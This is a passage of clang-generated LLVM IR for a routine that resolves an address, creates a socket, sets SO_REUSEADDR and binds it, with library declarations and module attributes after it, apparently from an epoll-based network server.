  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.275, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #8
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #8
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.276, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #8
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !28

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.277, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #8
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #2

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #2

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #2

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn writeonly }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind }
attributes #9 = { nounwind readonly willreturn }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
